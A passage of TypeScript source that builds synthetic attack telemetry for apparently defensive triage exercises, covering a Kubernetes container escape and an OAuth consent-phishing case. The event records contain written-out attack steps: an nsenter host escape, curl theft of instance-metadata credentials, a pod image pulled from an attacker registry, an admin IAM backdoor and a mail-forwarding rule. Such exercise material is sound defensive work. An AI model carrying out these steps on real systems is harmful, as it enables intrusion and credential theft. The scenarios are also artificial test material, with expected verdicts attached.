        "winlog.event_data.TargetUserName": "svc-deploy", "winlog.event_data.TargetDomainName": "NEXACORP", "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM", "winlog.event_data.WorkstationName": FS, "winlog.event_data.IpAddress": FS_IP, "winlog.event_data.IpPort": "52301",
      },
    },
    net("ntlm_10_net_conn_app", 25 * MIN + 100, FS, FS_IP, undefined, netUse(5576, "10.0.3.30"), "10.0.3.30", 52170, 445, "net.exe on SRV-FILE01 connected to 10.0.3.30 on port 445.", "high"),
    net("ntlm_10b_net_conn_sql", 25 * MIN + 40_100, FS, FS_IP, undefined, netUse(5592, "10.0.3.31"), "10.0.3.31", 52233, 445, "net.exe on SRV-FILE01 connected to 10.0.3.31 on port 445.", "high"),
    net("ntlm_10c_net_conn_dc", 26 * MIN + 35_100, FS, FS_IP, undefined, netUse(5608, "10.0.0.5"), "10.0.0.5", 52301, 445, "net.exe on SRV-FILE01 connected to 10.0.0.5 on port 445.", "high"),
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Tooling detection on a developer workstation", events, T, MIN };
}

/** Telemetry half of `buildK8sPodEscapeScenario`: the events and the story title, no answer key. */
export function k8sPodEscapeScenarioEvents() {
  const B = new Date("2026-05-20T02:45:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const ATT = "193.233.48.71";
  const RUNNER = "34.201.17.88";                  // the CI runner that normally uses the ci-deploy token
  const ACCT = "482910374256";
  const INSTANCE = "i-0a3f9c12d7b54e681";
  const NODE = "ip-10-0-14-73.ec2.internal", NODE_IP = "10.0.14.73";
  const CI_SA = "system:serviceaccount:cicd:ci-deploy";
  const CID = "a3f7b1c9d2e8" + makeSha256("api-prod-7f8b9c-container").slice(0, 52);
  const KUBECTL_UA = "kubectl/v1.30.0 (linux/amd64) kubernetes/7c48c2b";
  const AWS_UA = "aws-cli/2.17.60 md/awscrt#0.21.2 ua/2.0 os/linux#5.15.0 lang/python#3.11.4";
  const NODE_ROLE = `arn:aws:sts::${ACCT}:assumed-role/eks-node-role/${INSTANCE}`;

  // The service account as the API server names it, on every audit row.
  const saRaw = {
    "kubernetes.audit.user.username": CI_SA,
    "kubernetes.audit.user.groups[0]": "system:serviceaccounts",
    "kubernetes.audit.user.groups[1]": "system:serviceaccounts:cicd",
    "kubernetes.audit.user.groups[2]": "system:authenticated",
    "kubernetes.audit.userAgent": KUBECTL_UA,
  };
  // Credentials of the node role, on every CloudTrail row made with the stolen session.
  const roleRaw = (extra: Record<string, unknown>): Record<string, unknown> => ({
    "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": NODE_ROLE, "aws.cloudtrail.userIdentity.accountId": ACCT,
    // The node answered the credential request without a session token: IMDSv1, role delivery 1.0.
    "aws.cloudtrail.userIdentity.sessionContext.ec2RoleDelivery": "1.0",
    "aws.cloudtrail.sourceIPAddress": ATT, "aws.cloudtrail.userAgent": AWS_UA, "cloud.account.id": ACCT, ...extra,
  });
  const ct = (id: string, t: number, event_type: TelemetryEvent["event_type"], severity: TelemetryEvent["severity"], api: string, service: string, source: string,
    description: string, extra: Record<string, unknown>, more: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(t), source: "cloudtrail", vendor: "AWS CloudTrail", event_type, severity, src_ip: ATT, description,
    cloud: { provider: "aws", service, api_call: api, region: "eu-west-1" },
    raw: roleRaw({ "aws.cloudtrail.eventName": api, "aws.cloudtrail.eventSource": source, ...extra }), ...more,
  });

  // Process identities on the node (host pids). Everything below runs as root.
  const SHIM_ARGS = `-namespace k8s.io -id ${CID} -address /run/containerd/containerd.sock`;
  const shimA = { name: "containerd-shim-runc-v2", pid: 2874, path: "/usr/bin/containerd-shim-runc-v2", parent_name: "systemd", parent_pid: 1, cmdline: `/usr/bin/containerd-shim-runc-v2 ${SHIM_ARGS}`, user: "root" };
  const sh = { name: "sh", pid: 3120, path: "/bin/sh", parent_name: "containerd-shim-runc-v2", parent_pid: 2874, cmdline: "sh", user: "root" };
  const NSENTER_CMD = "nsenter --mount=/proc/1/ns/mnt --uts=/proc/1/ns/uts --ipc=/proc/1/ns/ipc --net=/proc/1/ns/net --pid=/proc/1/ns/pid -- bash";
  const nsenter = { name: "nsenter", pid: 3141, path: "/usr/bin/nsenter", parent_name: "sh", parent_pid: 3120, cmdline: NSENTER_CMD, user: "root" };
  const bash = { name: "bash", pid: 3149, path: "/usr/bin/bash", parent_name: "nsenter", parent_pid: 3141, cmdline: "bash", user: "root" };
  const IMDS = "http://169.254.169.254/latest/meta-data/iam/security-credentials";
  const curlList = { name: "curl", pid: 3158, path: "/usr/bin/curl", parent_name: "bash", parent_pid: 3149, cmdline: `curl -s ${IMDS}/`, user: "root" };
  const bashC = { name: "bash", pid: 3160, path: "/usr/bin/bash", parent_name: "bash", parent_pid: 3149, cmdline: `bash -c "curl -s ${IMDS}/eks-node-role > /tmp/.cache/.env"`, user: "root" };
  const curlCreds = { name: "curl", pid: 3162, path: "/usr/bin/curl", parent_name: "bash", parent_pid: 3160, cmdline: `curl -s ${IMDS}/eks-node-role`, user: "root" };
  const cat = { name: "cat", pid: 3171, path: "/usr/bin/cat", parent_name: "bash", parent_pid: 3149, cmdline: "cat /tmp/.cache/.env", user: "root" };
  const containerd = { name: "containerd", pid: 1203, path: "/usr/bin/containerd", parent_name: "systemd", parent_pid: 1, cmdline: "/usr/bin/containerd", user: "root" };
  const shimB = { name: "containerd-shim-runc-v2", pid: 5001, path: "/usr/bin/containerd-shim-runc-v2", parent_name: "systemd", parent_pid: 1,
    cmdline: `/usr/bin/containerd-shim-runc-v2 -namespace k8s.io -id ${makeSha256("svc-monitoring-backup-container")} -address /run/containerd/containerd.sock`, user: "root" };
  const agent = { name: "agent", pid: 5030, path: "/opt/metrics-agent/agent", parent_name: "containerd-shim-runc-v2", parent_pid: 5001, cmdline: "/opt/metrics-agent/agent --config /etc/metrics-agent/agent.yaml", user: "root" };

  const cs = (id: string, t: number, p: NonNullable<TelemetryEvent["process"]>, severity: TelemetryEvent["severity"], extra: Record<string, unknown> = {},
    more: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create", severity, hostname: NODE, src_ip: NODE_IP, process: p,
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.os.type": "linux", ...extra }, ...more,
  });
  const imds = (id: string, t: number, p: NonNullable<TelemetryEvent["process"]>, description: string): TelemetryEvent => ({
    id, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection", severity: "high", mitre_technique: "T1552.005",
    hostname: NODE, src_ip: NODE_IP, dst_ip: "169.254.169.254", dst_port: 80, protocol: "tcp", process: p, description,
    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "host.os.type": "linux" },
  });

  const events: TelemetryEvent[] = [
    // ── Baseline: how ci-deploy is normally used (from the CI runner, to update deployments) ──
    {
      id: "k8s_00_baseline_ci_deploy", ts: "2026-05-19T14:20:00.000Z", source: "k8s_audit", vendor: "Kubernetes Audit", event_type: "k8s_rbac", severity: "informational",
      is_baseline: true, expected_verdict: "informational", hostname: "api-prod", src_ip: RUNNER,
      description: "The ci-deploy service account patched the api-prod deployment from the CI runner 34.201.17.88 during yesterday's release.",
      raw: {
        "kubernetes.audit.verb": "patch", "kubernetes.audit.objectRef.resource": "deployments", "kubernetes.audit.objectRef.apiGroup": "apps", "kubernetes.audit.objectRef.apiVersion": "v1",
        "kubernetes.audit.objectRef.name": "api-prod", "kubernetes.audit.objectRef.namespace": "production", "kubernetes.audit.responseStatus.code": 200,
        "kubernetes.audit.requestURI": "/apis/apps/v1/namespaces/production/deployments/api-prod", "kubernetes.audit.sourceIPs[0]": RUNNER, ...saRaw,
      },
    },
    { ...cs("k8s_00a_baseline_shim_start", -1, shimA, "informational"), ts: "2025-11-04T08:12:50.000Z", is_baseline: true, expected_verdict: "informational",
      description: "containerd started the shim for the api-prod pod container when the pod was created." },

    // ── Initial access: the stolen CI token is replayed from an unrelated address ──
    {
      id: "k8s_01_kubectl_exec",
      ts: T(0),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      // T1609 Container Administration Command: running a command in an EXISTING container.
      // T1610 is Deploy Container (creating a new one), which is correct for k8s_09_privileged_pod.
      event_type: "k8s_exec", severity: "medium", mitre_technique: "T1609",
      hostname: "api-prod-7f8b9c", src_ip: ATT, dst_port: 443,
      description: "The ci-deploy service account ran kubectl exec into container api-prod-7f8b9c from 193.233.48.71, an address on a hosting provider's network.",
      fp_explanation: "kubectl exec is routine in dev and SRE workflows: engineers exec into containers to debug them many times a day, and ci-deploy is a legitimate service account that is expected to touch production workloads.",
      raw: {
        "kubernetes.audit.verb": "create",
        "kubernetes.audit.objectRef.resource": "pods",
        "kubernetes.audit.objectRef.subresource": "exec",
        "kubernetes.audit.objectRef.name": "api-prod-7f8b9c",
        "kubernetes.audit.objectRef.namespace": "production",
        "kubernetes.audit.sourceIPs[0]": ATT,
        "kubernetes.audit.responseStatus.code": 101,
        "kubernetes.audit.requestURI": "/api/v1/namespaces/production/pods/api-prod-7f8b9c/exec?command=sh&stdin=true&stdout=true&tty=true",
        ...saRaw,
      },
    },
    // The container's shell starts under the runtime shim, a few milliseconds after the exec is admitted.
    cs("k8s_01c_container_shell", 1 * SEC, sh, "low", {}, { description: "A sh process started inside the api-prod container under the containerd shim, as root." }),
    // ── The misconfiguration that MAKES the escape possible ──
    // Without it the scenario would teach the single most common misconception in container
    // security: that `nsenter --mount=/proc/1/ns/mnt` escapes an ordinary hardened container. It does
    // not: reaching the HOST's namespaces through /proc/1 requires hostPID, and setns() requires
    // CAP_SYS_ADMIN (in practice, privileged). The pod spec read shows api-prod-7f8b9c had run that way
    // for months, and which node it runs on.
    {
      id: "k8s_01b_pod_spec_review",
      ts: T(1 * MIN),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      event_type: "k8s_rbac", severity: "medium",
      hostname: "api-prod-7f8b9c", src_ip: ATT,
      description: "The pod spec for api-prod-7f8b9c was read. The container runs with privileged true, hostPID true, and CAP_SYS_ADMIN, on node ip-10-0-14-73.ec2.internal.",
      fp_explanation: "Reading a pod spec is ordinary operational activity, and this deployment has run with these settings since it was created: the workload needs host-level metrics collection.",
      raw: {
        "kubernetes.audit.verb": "get",
        "kubernetes.audit.level": "RequestResponse",
        "kubernetes.audit.objectRef.resource": "pods",
        "kubernetes.audit.objectRef.name": "api-prod-7f8b9c",
        "kubernetes.audit.objectRef.namespace": "production",
        "kubernetes.audit.sourceIPs[0]": ATT,
        "kubernetes.audit.responseStatus.code": 200,
        "kubernetes.audit.requestURI": "/api/v1/namespaces/production/pods/api-prod-7f8b9c",
        "kubernetes.audit.responseObject.spec.hostPID": true,
        "kubernetes.audit.responseObject.spec.nodeName": NODE,
        "kubernetes.audit.responseObject.spec.containers[0].securityContext.privileged": true,
        "kubernetes.audit.responseObject.spec.containers[0].securityContext.capabilities.add[0]": "SYS_ADMIN",
        "kubernetes.audit.responseObject.status.hostIP": NODE_IP,
        "kubernetes.audit.responseObject.status.containerStatuses[0].containerID": `containerd://${CID}`,
        "kubernetes.audit.responseObject.metadata.creationTimestamp": "2025-11-04T08:12:44Z",
        ...saRaw,
      },
    },

    // ── Container escape: nsenter into the host namespaces, then a root shell on the node ──
    cs("k8s_02_nsenter_escape", 2 * MIN, nsenter, "critical", {}, {
      mitre_technique: "T1611",
      description: "nsenter ran inside container a3f7b1c9d2e8 with all five host namespace flags (mount, uts, ipc, net, pid), spawning bash as root on the node.",
    }),
    cs("k8s_02b_host_shell", 2 * MIN + 1 * SEC, bash, "high", {}, { description: "bash started as a child of nsenter in the host's namespaces: a root shell on the node." }),
    {
      id: "k8s_02c_edr_alert", ts: T(2 * MIN + 4 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert", severity: "critical",
      is_detection: true, mitre_technique: "T1611", mitre_tactic: "Privilege Escalation", hostname: NODE, src_ip: NODE_IP, process: nsenter,
      description: "CrowdStrike detected nsenter running inside container a3f7b1c9d2e8 with host namespace flags, spawning bash as root. Disposition: detection only.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.DetectName": "NsenterContainerEscape",
        "crowdstrike.DetectDescription": "A process in container a3f7b1c9d2e8 used nsenter to enter the host's namespaces.",
        "crowdstrike.SeverityName": "Critical", "crowdstrike.Tactic": "Privilege Escalation", "crowdstrike.Technique": "Escape to Host",
        "threat.technique.id": "T1611", "crowdstrike.PatternDispositionDescription": "Detection, No Action",
        "crowdstrike.FileName": "nsenter", "crowdstrike.ParentImageFileName": "sh", "crowdstrike.GrandparentImageFileName": "containerd-shim-runc-v2",
        "crowdstrike.event_platform": "Lin", "host.os.type": "linux",
      },
    },

    // ── Credential theft from the instance metadata service ──
    cs("k8s_03a_imds_role_lookup", 2 * MIN + 50 * SEC, curlList, "medium"),
    imds("k8s_03a_imds_role_lookup_net", 2 * MIN + 50 * SEC + 200, curlList, "curl on the node asked the metadata service at 169.254.169.254 for the name of the attached IAM role."),
    cs("k8s_03_imds_shell", 2 * MIN + 59 * SEC, bashC, "high"),
    cs("k8s_03b_imds_curl", 3 * MIN, curlCreds, "high"),
    imds("k8s_03_imds_query", 3 * MIN + 200, curlCreds, "curl on the node requested the credentials of the attached role eks-node-role from the metadata service."),
    {
      id: "k8s_04_creds_written", ts: T(3 * MIN + 600), source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create", severity: "high", mitre_technique: "T1552.005",
      hostname: NODE, src_ip: NODE_IP, process: curlCreds, file: { name: ".env", path: "/tmp/.cache/.env", size: 1647 },
      description: "The credentials returned by the metadata service were written to /tmp/.cache/.env on the node.",
      raw: { "crowdstrike.event_simpleName": "GenericFileWritten", "host.os.type": "linux" },
    },
    cs("k8s_04b_creds_read", 4 * MIN, cat, "high", {}, { description: "cat printed /tmp/.cache/.env into the root shell on the node, which is the exec session the attacker is driving." }),

    // ── The node role's session is used from outside AWS, and GuardDuty fires ──
    ct("k8s_05_sts_verify", 5 * MIN, "cloud_api_call", "medium", "GetCallerIdentity", "sts", "sts.amazonaws.com",
      "GetCallerIdentity was called using the eks-node-role assumed role from 193.233.48.71, an IP outside AWS's published ranges.", {},
      { mitre_technique: "T1552.005", dst_port: 443,
        fp_explanation: "GetCallerIdentity is one of the most common calls in any AWS account: the SDKs issue it on startup to confirm which identity they are running as, so it appears constantly in CloudTrail for healthy workloads." }),
    {
      id: "k8s_05z_guardduty", ts: T(5 * MIN + 30 * SEC), source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call", severity: "high",
      src_ip: ATT, is_detection: true, mitre_technique: "T1552.005", mitre_tactic: "Credential Access",
      description: "GuardDuty raised UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS (severity 8) for credentials of instance role eks-node-role used from 193.233.48.71.",
      cloud: { provider: "aws", service: "sts", api_call: "GetCallerIdentity", region: "eu-west-1" },
      raw: {
        "aws.guardduty.type": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS", "aws.guardduty.severity": "8",
        "aws.guardduty.title": "Credentials that were created exclusively for an EC2 instance through an Instance launch role are being used from an external IP address.",
        "aws.guardduty.service.action.actionType": "AWS_API_CALL", "aws.guardduty.service.action.awsApiCallAction.api": "GetCallerIdentity",
        "aws.guardduty.service.action.awsApiCallAction.serviceName": "sts.amazonaws.com", "aws.guardduty.service.action.awsApiCallAction.callerType": "Remote IP",
        "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails.ipAddressV4": ATT,
        "aws.guardduty.resource.resourceType": "AccessKey", "aws.guardduty.resource.accessKeyDetails.userType": "AssumedRole",
        "aws.guardduty.resource.accessKeyDetails.userName": "eks-node-role",
        "aws.guardduty.resource.instanceDetails.instanceId": INSTANCE,
        "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": NODE_ROLE, "aws.cloudtrail.userIdentity.accountId": ACCT,
        "cloud.account.id": ACCT, "cloud.region": "eu-west-1",
      },
    },
    ct("k8s_06_list_buckets", 6 * MIN, "cloud_api_call", "high", "ListBuckets", "s3", "s3.amazonaws.com",
      "ListBuckets was called using the same assumed role from the same external IP, returning 14 buckets.", {}, { mitre_technique: "T1580" }),
    ct("k8s_07_describe_instances", 7 * MIN, "cloud_api_call", "high", "DescribeInstances", "ec2", "ec2.amazonaws.com",
      "DescribeInstances was called using the same assumed role, requesting up to 1000 results.", { "aws.cloudtrail.requestParameters.maxResults": 1000 }, { mitre_technique: "T1580" }),
    ct("k8s_08_secrets_access", 9 * MIN, "cloud_storage_access", "critical", "GetObject", "s3", "s3.amazonaws.com",
      "GetObject retrieved s3://rocketstack-secrets-prod/db-passwords.json (4,218 bytes) using the same assumed role from 193.233.48.71.",
      { "aws.cloudtrail.requestParameters.bucketName": "rocketstack-secrets-prod", "aws.cloudtrail.requestParameters.key": "db-passwords.json" },
      { mitre_technique: "T1530", cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "eu-west-1", resource: "rocketstack-secrets-prod" }, network: { bytes_out: 4218 } }),

    // ── Cluster persistence: a privileged pod pulled from the attacker's registry ──
    {
      id: "k8s_09_privileged_pod",
      ts: T(12 * MIN),
      source: "k8s_audit", vendor: "Kubernetes Audit",
      event_type: "k8s_pod_create", severity: "critical", mitre_technique: "T1610",
      src_ip: ATT,
      description: "ci-deploy created a pod named svc-monitoring-backup in kube-system with hostPID, hostNetwork, and privileged:true, pulling its image from 193.233.48.71:5000.",
      raw: {
        "kubernetes.audit.verb": "create",
        "kubernetes.audit.objectRef.resource": "pods",
        "kubernetes.audit.objectRef.namespace": "kube-system",
        "kubernetes.audit.objectRef.name": "svc-monitoring-backup",
        "kubernetes.audit.sourceIPs[0]": ATT,
        "kubernetes.audit.responseStatus.code": 201,
        "kubernetes.audit.requestURI": "/api/v1/namespaces/kube-system/pods",
        "kubernetes.audit.requestObject.spec.hostPID": true,
        "kubernetes.audit.requestObject.spec.hostNetwork": true,
        "kubernetes.audit.requestObject.spec.containers[0].securityContext.privileged": true,
        "kubernetes.audit.requestObject.spec.containers[0].image": `${ATT}:5000/metrics-agent:2.4`,
        ...saRaw,
      },
    },
    {
      id: "k8s_09a_image_pull", ts: T(12 * MIN + 10 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection", severity: "high", mitre_technique: "T1610",
      hostname: NODE, src_ip: NODE_IP, dst_ip: ATT, src_port: 41822, dst_port: 5000, protocol: "tcp", process: containerd,
      description: "containerd on the node opened a connection to 193.233.48.71 on port 5000 to pull an image.",
      raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "host.os.type": "linux" },
    },
    cs("k8s_09b_shim_start", 12 * MIN + 15 * SEC, shimB, "low"),
    cs("k8s_09c_container_entry", 12 * MIN + 20 * SEC, agent, "high", {}, { description: "The new container's entry process /opt/metrics-agent/agent started as root under its own containerd shim." }),

    // ── Cloud persistence: an IAM user with admin rights and an access key ──
    ct("k8s_10_iam_backdoor", 15 * MIN, "account_create", "critical", "CreateUser", "iam", "iam.amazonaws.com",
      "CreateUser created IAM user svc-monitoring-backup, called with the eks-node-role assumed role from 193.233.48.71.",
      { "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup", "aws.cloudtrail.requestParameters.path": "/",
        "aws.cloudtrail.responseElements.user.arn": `arn:aws:iam::${ACCT}:user/svc-monitoring-backup` }, { mitre_technique: "T1136.003" }),
    ct("k8s_11_iam_policy_attach", 15 * MIN + 11_000, "cloud_role_change", "critical", "AttachUserPolicy", "iam", "iam.amazonaws.com",
      "AttachUserPolicy attached the AWS-managed AdministratorAccess policy to svc-monitoring-backup, eleven seconds after the account was created.",
      { "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup", "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess" },
      { mitre_technique: "T1098.003" }),
    ct("k8s_11a_access_key", 15 * MIN + 25_000, "cloud_api_call", "critical", "CreateAccessKey", "iam", "iam.amazonaws.com",
      "CreateAccessKey issued an access key for svc-monitoring-backup, from the same external IP.",
      { "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup" }, { mitre_technique: "T1098.001" }),
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "GuardDuty finding on the production EKS cluster", events, T, MIN };
}

/** Telemetry half of `buildOAuthConsentPhishingScenario`: the events and the story title, no answer key. */
export function oauthConsentPhishingScenarioEvents() {
  const B = new Date("2026-06-11T22:14:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;
  const APP_ID = "a3f9b1c2-d4e5-4f67-8901-ab2cd3ef4567";
  const EMAIL = "j.chen@nexacorp.com";
  const HOME_IP = "86.9.140.22";        // j.chen's home broadband
  const APP_IP = "20.50.142.37";        // the app operator's cloud-hosted backend that calls Graph
  const SENDER_IP = "185.234.218.74";
  const PY = "python-requests/2.31.0";
  const SCOPES = "Mail.ReadWrite MailboxSettings.ReadWrite Files.ReadWrite.All Calendars.Read";
  const CONSENT_URL = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${APP_ID}&redirect_uri=https%3A%2F%2Fproductivty-suite.com%2Fcallback&response_type=code&scope=Mail.ReadWrite%20MailboxSettings.ReadWrite%20Files.ReadWrite.All%20Calendars.Read%20offline_access`;

  // Delegated Graph access by the app: the audit record names the USER (the token is j.chen's) and the APP in AppId.
  const mailBatch = (n: number, t: number, count: number, folder: string, desc: string): TelemetryEvent => ({
    id: `oauth_02_mail_access_${n}`, ts: T(t), source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call", severity: "high",
    ...(n === 1 ? { mitre_technique: "T1114.002", fp_explanation: "MailItemsAccessed by an application is common: CRM tools and archival apps do this constantly. The Microsoft 365 compliance center logs thousands of these per day." } : {}),
    hostname: "graph.microsoft.com", user_email: EMAIL, src_ip: APP_IP, description: desc,
    raw: {
      "data.office365.Operation": "MailItemsAccessed", "data.office365.UserId": EMAIL, "data.office365.ClientInfoString": "Client=REST;Client=RESTSystem;;",
      "data.office365.AppId": APP_ID, "application.id": APP_ID, "application.name": "Productivity Suite Pro",
      "data.office365.ClientIPAddress": APP_IP, "data.office365.Workload": "Exchange", "data.office365.MailboxOwnerUPN": EMAIL,
      "data.office365.OperationCount": count, "data.office365.Folders.Path": folder,
    },
  });

  // Nine files from the Finance site, the DLP-flagged contract third.
  const fin = "https://nexacorp.sharepoint.com/sites/Finance/Shared Documents";
  const files = [
    { p: "Contracts/Contract-Northgate-2026.docx" }, { p: "Contracts/Contract-Meridian-2025.docx" }, { p: "Contracts/Contract-GlobalLogis-2026.docx" },
    { p: "Budgets/FY27-Budget-Draft.xlsx" }, { p: "Budgets/Q2-Forecast.xlsx" }, { p: "Reports/Board-Pack-Q1-2026.pptx" },
    { p: "Reports/Audit-Findings-2026.pdf" }, { p: "Vendors/Vendor-Master-List.xlsx" }, { p: "Vendors/Bank-Detail-Changes-2026.xlsx" },
  ].map((f, i): TelemetryEvent => ({
    id: `oauth_05_sharepoint_download_${String(i + 1).padStart(2, "0")}`, ts: T(61 * MIN + i * 14 * SEC), source: "o365", vendor: "Microsoft 365 Unified Audit Log",
    event_type: "sharepoint_download", severity: "high", ...(i === 0 ? { mitre_technique: "T1530" } : {}),
    hostname: "nexacorp.sharepoint.com", user_email: EMAIL, src_ip: APP_IP,
    description: `FileDownloaded: ${f.p} from the Finance SharePoint site, from ${APP_IP} with a python-requests user agent.`,
    raw: {
      "data.office365.Operation": "FileDownloaded", "data.office365.UserId": EMAIL, "data.office365.Workload": "SharePoint", "data.office365.ClientIPAddress": APP_IP,
      "data.office365.SiteUrl": "https://nexacorp.sharepoint.com/sites/Finance", "data.office365.ObjectId": `${fin}/${f.p}`, "data.office365.SourceFileName": f.p.split("/").pop(),
      "data.office365.UserAgent": PY,
    },
  }));

  const events: TelemetryEvent[] = [
    // ── Initial access: a lure from a lookalike domain, delivered and clicked from home ──
    {
      id: "oauth_00a_email_delivered", ts: T(-22 * MIN), source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received", severity: "medium",
      mitre_technique: "T1566.002", user_email: EMAIL, src_ip: SENDER_IP, network: { url: CONSENT_URL, domain: "login.microsoftonline.com" },
      description: "A message from no-reply@productivty-suite.com titled 'Your shared workspace archive is ready' was delivered to j.chen's inbox with a Microsoft sign-in link.",
      raw: {
        "data.office365.Sender": "no-reply@productivty-suite.com", "data.office365.Recipients": EMAIL, "data.office365.Subject": "Your shared workspace archive is ready - approve access",
        "data.office365.SenderIp": SENDER_IP, "data.office365.InternetMessageId": "<20260611215200.8D3A1F6C27@productivty-suite.com>",
        "data.office365.NetworkMessageId": "5d2b8a47-61c9-4f0e-9a3b-e7d41c08f5a2", "data.office365.DeliveryAction": "Delivered", "data.office365.Directionality": "Inbound",
      },
    },
    {
      id: "oauth_00b_link_click", ts: T(-20 * SEC), source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_clicked", severity: "medium",
      mitre_technique: "T1566.002", user_email: EMAIL, src_ip: HOME_IP, network: { url: CONSENT_URL, domain: "login.microsoftonline.com" },
      description: "j.chen clicked the Microsoft sign-in link in the 'Your shared workspace archive is ready' message from her home address; Safe Links allowed the click.",
      raw: { "data.office365.NetworkMessageId": "5d2b8a47-61c9-4f0e-9a3b-e7d41c08f5a2" },
    },
    // ── The consent grant ──
    {
      id: "oauth_01_consent_grant",
      ts: T(0),
      source: "o365", vendor: "Microsoft Entra ID",
      event_type: "role_assignment", severity: "high", mitre_technique: "T1528",
      hostname: "aad.nexacorp.com", user_email: EMAIL, src_ip: HOME_IP,
      description: "j.chen granted OAuth consent to an app named Productivity Suite Pro, requesting Mail.ReadWrite, MailboxSettings.ReadWrite, Files.ReadWrite.All, and Calendars.Read.",
      it_context: { result: "confirmed", message: "IT has no ticket or change record for Productivity Suite Pro. The tenant's user-consent policy lets staff approve apps for their own mail and files, so the grant itself was permitted." },
      fp_explanation: "OAuth consent grants are extremely common: users consent to dozens of productivity apps. This looks like Slack/Zoom/Notion onboarding by a user working in the evening from home.",
      raw: {
        "data.office365.Operation": "Consent to application",
        "data.office365.AzureActiveDirectoryEventType": 1,
        "data.office365.UserId": EMAIL,
        "data.office365.ActorIpAddress": HOME_IP,
        "data.office365.Target[0].ID": APP_ID,
        "data.office365.Target[0].Type": "1",
        "data.office365.ExtendedProperties[0].Name": "AppDisplayName",
        "data.office365.ExtendedProperties[0].Value": "Productivity Suite Pro",
        "data.office365.ExtendedProperties[1].Name": "Permissions",
        "data.office365.ExtendedProperties[1].Value": SCOPES,
        "data.office365.ExtendedProperties[2].Name": "AppId",
        "data.office365.ExtendedProperties[2].Value": APP_ID,
        "data.office365.ResultStatus": "Success",
      },
    },

    // ── The app works as j.chen, with her token, from its own backend ──
    mailBatch(1, 55 * MIN, 500, "Inbox", "MailItemsAccessed: 500 items read from j.chen's Inbox by AppId a3f9b1c2 through Microsoft Graph from 20.50.142.37, 55 minutes after the consent."),
    mailBatch(2, 56 * MIN, 400, "Sent Items", "MailItemsAccessed: 400 items read from j.chen's Sent Items by AppId a3f9b1c2 from 20.50.142.37."),
    mailBatch(3, 57 * MIN, 347, "Archive", "MailItemsAccessed: 347 items read from j.chen's Archive folder by AppId a3f9b1c2 from 20.50.142.37."),
    {
      id: "oauth_04_inbox_rule",
      ts: T(58 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "policy_modification", severity: "high", mitre_technique: "T1114.003",
      hostname: "outlook.office365.com", user_email: EMAIL, src_ip: APP_IP,
      description: "New-InboxRule was created under j.chen's account with AppId a3f9b1c2 (the app, not Outlook), forwarding all mail to backupmail@productivity-suite.pro.",
      raw: {
        "data.office365.Operation": "New-InboxRule",
        "data.office365.UserId": EMAIL,
        "data.office365.AppId": APP_ID,
        "data.office365.ClientInfoString": "Client=REST;Client=RESTSystem;;",
        "data.office365.Workload": "Exchange",
        "data.office365.ClientIPAddress": APP_IP,
        "data.office365.Parameters[0].Name": "Name",
        "data.office365.Parameters[0].Value": "Backup Sync Rule",
        "data.office365.Parameters[1].Name": "ForwardTo",
        "data.office365.Parameters[1].Value": "backupmail@productivity-suite.pro",
        "data.office365.Parameters[2].Name": "MarkAsRead",
        "data.office365.Parameters[2].Value": "True",
        "data.office365.Parameters[3].Name": "ApplyToAllMessages",
        "data.office365.Parameters[3].Value": "True",
      },
    },
    ...files,
    mailBatch(4, 65 * MIN, 847, "Calendar", "MailItemsAccessed: 847 calendar items read from j.chen's Calendar folder by AppId a3f9b1c2 from 20.50.142.37."),

    // ── Detection: Purview on the contract, then Defender for Cloud Apps on the app ──
    {
      id: "oauth_08_dlp_contract",
      ts: T(72 * MIN),
      source: "dlp", vendor: "Microsoft Purview",
      event_type: "dlp_alert", severity: "critical", mitre_technique: "T1530",
      hostname: "nexacorp.sharepoint.com", user_email: EMAIL,
      file: { name: "Contract-GlobalLogis-2026.docx", path: `${fin}/Contracts/Contract-GlobalLogis-2026.docx` },
      description: "Microsoft Purview DLP fired its Confidential Documents - External Access policy on Contract-GlobalLogis-2026.docx in the Finance SharePoint site after it was downloaded by a non-corporate client.",
      raw: {
        "data.office365.Operation": "DlpRuleMatch",
        "data.office365.Workload": "SharePoint",
        "data.office365.PolicyDetails[0].PolicyName": "Confidential Documents - External Access",
